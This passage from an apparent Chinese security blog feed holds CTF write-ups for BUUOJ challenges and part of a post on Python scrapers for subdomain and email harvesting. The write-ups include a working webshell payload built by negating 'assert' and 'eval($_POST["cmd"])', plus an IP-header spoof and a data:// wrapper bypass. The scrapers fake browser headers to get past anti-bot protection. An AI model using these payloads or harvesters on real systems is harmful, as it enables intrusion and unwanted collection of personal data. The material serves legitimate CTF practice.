class="line-numbers language-none"><code class="language-none">bì jí dì dà kuò hào zhè jiù shì fǔ lài gē zhí jiē jiāo lè bā dà kuò hào BJD&#123;淛匶襫黼瀬鎶軄鶛驕鳓哵&#125;中间的不改动就好<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="BJDCTF-2nd-cat-flag"><a href="#BJDCTF-2nd-cat-flag" class="headerlink" title="[BJDCTF 2nd]cat_flag"></a>[BJDCTF 2nd]cat_flag</h2><p><strong>考点：二进制</strong></p><p>做了分帧的操作，没有什么作用，16进制和通道分离也都没有看出什么端倪，最后还是要回归到这张gif本身，很多的小方格，有的有鸡腿，有的是米饭，刚好只有两种可能，要么是鸡腿要么是米饭，那么就有可能是二进制了。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210421233857.png" alt="gif"></p><p>所以整一下二进制看看行不行：</p><pre class="line-numbers language-none"><code class="language-none">010000100100101001000100011110110100110100100001001100000111111001111101转一下ascii<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210421234316.png" alt="转码"></p><p>得到flag</p><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>考点：代码审计、绕过</p><p>第一层套娃的源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">substr_count</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'_'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token class-name">substr_count</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'%5f'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y0u are So cutE!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b_u_p_t'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'23333'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^23333$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b_u_p_t'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you are going to the next ~"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里会对QUERY_STRING获取的字符进行子串计数，只有没有相关子串存在才行，但是下面GET参数为b_u_p_t所以需要绕过，这里可以利用substr_count函数区分大小写来用%5F来绕过，也可以利用空格与_等效来绕过。后面和23333比较的绕过则使用23333%0a即可绕过，这样即可以满足匹配也能够满足比较不同。</p><p><code>?b%5Fu%5Fp%5Ft</code></p><p>第二层套娃,首先jsfuck得到传POST参数Merak，得到源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string single-quoted-string">'takeip.php'</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Merak'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">function</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token variable">$v</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>     <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token variable">$re</span> <span class="token operator">.=</span> <span class="token function">chr </span><span class="token punctuation">(</span> <span class="token function">ord </span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token operator">*</span><span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">return</span> <span class="token variable">$re</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Local access only!'</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">getIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!=</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Sorry,you don't have permission!  Your ip is :"</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'127.0.0.1'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'2333'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'todat is a happy day'</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Your REQUEST is:"</span><span class="token operator">.</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Client-ip的http头部实现绕过本地验证，然后利用PHP伪协议满足2333比较<code>data://text/plain,todat is a happy day</code>,这样就到最后一步了，需要针对change函数，编写逆向算法破解，来读取flag文件。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$result</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token variable">$i</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/202108281933770.png" alt="image-20210828193338821"></p><h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><p>考点：无符号RCE</p><p>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"This is too Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                <span class="token punctuation">&#125;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                <span class="token punctuation">&#125;</span>                    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// </span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用取反来绕过，exp:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'eval($_POST["cmd"])'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后构造如下payload：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//69139acd-11a7-4c21-a087-feb44a969ae1.node4.buuoj.cn:81/?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%9C%92%9B%DD%A2%D6);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再使用antsword去连接一下webshell。</p><p><img src="C:\Users\lilon\AppData\Roaming\Typora\typora-user-images\image-20210930203912566.png" alt="image-20210930203912566"></p><p>发现被限制了执行命令，利用answord自带的disable_function绕过插件。</p><p><img src="C:\Users\lilon\AppData\Roaming\Typora\typora-user-images\image-20210930204147075.png" alt="image-20210930204147075"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;HITCON-2017-Babyfirst-Revenge&quot;&gt;&lt;a href=&quot;#HITCON-2017-Babyfirst-Revenge&quot; class=&quot;headerlink&quot; title=&quot;[HITCON 2017]Babyfirst-Revenge&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
    <category term="BUUOJ" scheme="http://yoursite.com/tags/BUUOJ/"/>
    
  </entry>
  
  <entry>
    <title>Python安全编程小练习2</title>
    <link href="http://yoursite.com/post/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B%E5%B0%8F%E7%BB%83%E4%B9%A02.html"/>
    <id>http://yoursite.com/post/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B%E5%B0%8F%E7%BB%83%E4%B9%A02.html</id>
    <published>2021-04-14T11:32:47.000Z</published>
    <updated>2021-06-28T14:41:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天继续，来看看子域名挖掘和邮件爬取，今天涉及的两者都是对网络爬虫的深入应用，从而实现信息搜集目的。并且因为是利用爬虫来爬取搜索引擎的信息，所以直接面临的就是百度等网站的反爬虫保护，而我们要实现工具的使用就需要绕过这些保护。</p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>就按照书上的来，我们也来看看必应搜索(<a href="http://cn.bing.com),首先我们先来使用浏览器来访问看看情况./">http://cn.bing.com)，首先我们先来使用浏览器来访问看看情况。</a></p><p>在bing中利用一定的语法site:baidu.com进行搜索，在结果中就得到了很多baidu.com的子域名链接，同时我们要关注url处是如何进行构造的。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210414193956381.png" alt="搜索"></p><pre class="line-numbers language-http" data-language="http"><code class="language-http">#从首页发起搜索<span class="token header-name keyword">https:</span>//cn.bing.com/search?q=site%3Abaidu.com&amp;qs=n&amp;form=QBLH&amp;sp=-1&amp;pq=site%3Abaidu.com&amp;sc=0-14&amp;sk=&amp;cvid=A64D46DEDA524035AA338C574E14F7B3#解个url方便看吧：<span class="token header-name keyword">https:</span>//cn.bing.com/search?q=site:baidu.com&amp;qs=n&amp;form=QBLH&amp;sp=-1&amp;pq=site:baidu.com&amp;sc=0-14&amp;sk=&amp;cvid=A64D46DEDA524035AA338C574E14F7B3#从其他搜索结果页面也发起搜索<span class="token header-name keyword">https:</span>//cn.bing.com/search?q=site%3Abaidu.com&amp;go=搜索&amp;qs=ds&amp;form=QBRE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    可用看到我们是如何进行bing搜索的，首先参数被传到了/search路由处，参数<code>q</code>是我们输入查询的内容，其他一大堆参数经过测试都与搜索结果无关，可用删除，最后基本也会得到一个精简的类似从其他搜索结果页面发起搜索的url，所以我们主要还是来看上面的最后一个URL，其实也基本就是靠q了其他的是一些应该要有的参数和内容，我们就不多做修改了，q就是我们要替换成我们自己的目标的地方。关于这个url还有一个细节的参数，通过切换页面，我们可用发现页面的切换是使用first参数来实现的。</p><p>例如我切换到第2页，结果为first=9，第三页时，结果为first=19，以此类推。</p><pre class="line-numbers language-none"><code class="language-none">设页数为x，则first&#x3D;(x-1)*10-1，当然first只是标记了链接序号，只要序号在相应的页数中都是会返回该页内容，first为1是第一页，为10是第二页。所以这里可用有多种表达式。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210414195529612.png" alt="first"></p><p>这时候可以先去用交互式，写个简单爬虫去尝试爬一下看看回复。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210414203052.png" alt="爬虫"></p><p>从结果中可用看出，每一个子域名都是处于<code>&lt;h2&gt;</code>标签中<code>&lt;a&gt;</code>的href属性值。所以这就是我们可用利用beautifulsoup库来获取子域名的地方了。现在到这里我们知道了网络爬虫目标url和一些目标url参数作用。</p><p>下面也稍微伪装伪装我们的爬虫，至少让它尽量正常点。首先就是要从http header 下手了。构造一个比较正常的请求头部，这里直接用firefox去看一下http包，或者抓个包看看也可用。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210414205229.png"></p><p>这是我的firefox访问bing的http头，</p><pre class="line-numbers language-none"><code class="language-none">&#39;Accept&#39;: &#39;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&#39;,&#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,&#39;Accept-Language&#39;: &#39;zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2&#39;,&#39;Referer&#39;: &#39;https:&#x2F;&#x2F;cn.bing.com&#x2F;search?q&#x3D;site%3abaidu.com&amp;go&#x3D;%E6%90%9C%E7%B4%A2&amp;qs&#x3D;ds&amp;first&#x3D;0&amp;FORM&#x3D;PERE1&#39;&#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko&#x2F;20100101 Firefox&#x2F;87.0&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="子域名搜集"><a href="#子域名搜集" class="headerlink" title="子域名搜集"></a>子域名搜集</h1><p>然后配合requests库提供的session()函数来实现cookie，就基本完成了。下面开始编写程序。</p><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/python3</span><span class="token comment"># _*_ coding:utf-8 _*_</span><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">bing_search</span><span class="token punctuation">(</span>site<span class="token punctuation">,</span> pages<span class="token punctuation">)</span><span class="token punctuation">:</span>    subdomain <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span><span class="token punctuation">,</span>               <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>               <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span><span class="token punctuation">,</span>               <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'https://cn.bing.com/search?q=site%3abaidu.com&amp;go=%E6%90%9C%E7%B4%A2&amp;qs=ds&amp;first=0&amp;FORM=PERE1'</span><span class="token punctuation">,</span>               <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0'</span>               <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> pages <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string">"https://cn.bing.com/search?q=site%3A"</span> <span class="token operator">+</span> site <span class="token operator">+</span> <span class="token string">"&amp;go=搜索&amp;qs=ds&amp;first="</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>            <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;form=QBRE"</span>        conn <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://cn.bing.com'</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        html <span class="token operator">=</span> conn<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> stream<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span>        soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">.</span>content<span class="token punctuation">,</span> <span class="token string">'html.parser'</span><span class="token punctuation">)</span>        h2 <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'h2'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> h2<span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>            link <span class="token operator">=</span> j<span class="token punctuation">.</span>a<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">pass</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> link<span class="token punctuation">:</span>                    domain <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>urlparse<span class="token punctuation">(</span>link<span class="token punctuation">)</span><span class="token punctuation">.</span>scheme <span class="token operator">+</span> <span class="token string">"://"</span> <span class="token operator">+</span> urlparse<span class="token punctuation">(</span>link<span class="token punctuation">)</span><span class="token punctuation">.</span>netloc<span class="token punctuation">)</span>                    <span class="token keyword">if</span> domain <span class="token keyword">in</span> subdomain<span class="token punctuation">:</span>                        <span class="token keyword">pass</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        subdomain<span class="token punctuation">.</span>append<span class="token punctuation">(</span>domain<span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]"</span> <span class="token operator">+</span> domain<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>        site <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        page <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]usage:&#123;&#125; baidu.com 10"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    bing_search<span class="token punctuation">(</span>site<span class="token punctuation">,</span> page<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然也不是一开始就得到这个最终源码的，也是要通过不断地进行调试和尝试，发现问题并且改进例如try-except-else就是为了解决某些情况下异常情况，而对link值时候存在的判断也是为了解决某些情况下link为空是的无效输出。</p><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210414232216.png" alt="运行结果"></p><p>当然可能还是有可能存在非预期的情况，导致出现异常或出错，这是需要大量的域名测试来优化保证的，我这里只用了几个域名就已经简单优化了两次了。这就是基于爬虫的子域名查询工具的写法，其他搜索引擎原理类似，就是要看需不需要绕过反爬虫保护了。</p><h1 id="邮件搜集"><a href="#邮件搜集" class="headerlink" title="邮件搜集"></a>邮件搜集</h1><p>下面在来一个邮件地址爬取的，原理其实和上面的也差不多。用了sys+optparse的组合来处理终端命令，requests+beautifulsoup实现网络爬虫，再用re来进行匹配。</p><h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/python3</span><span class="token comment"># _*_ coding:utf-8 _*_</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> optparse<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">banner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'                      _ _       \n'</span>          <span class="token string">'  ___ _ __ ___   __ _(_) | ___ _ __ \n'</span>          <span class="token string">" / _ \ '_ ` _ \ / _` | | |/ _ \ '__|\n"</span>          <span class="token string">"|  __/ | | | | | (_| | | |  __/ |   \n"</span>          <span class="token string">" \___|_| |_| |_|\__,_|_|_|\___|_|       v0.1\n"</span>          <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">center</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> pages<span class="token punctuation">)</span><span class="token punctuation">:</span>    emails <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    key_words <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">,</span> <span class="token string">'mail'</span><span class="token punctuation">,</span> <span class="token string">'mailbox'</span><span class="token punctuation">,</span> <span class="token string">'邮件'</span><span class="token punctuation">,</span> <span class="token string">'邮箱'</span><span class="token punctuation">,</span> <span class="token string">'postbox'</span><span class="token punctuation">]</span>    <span class="token 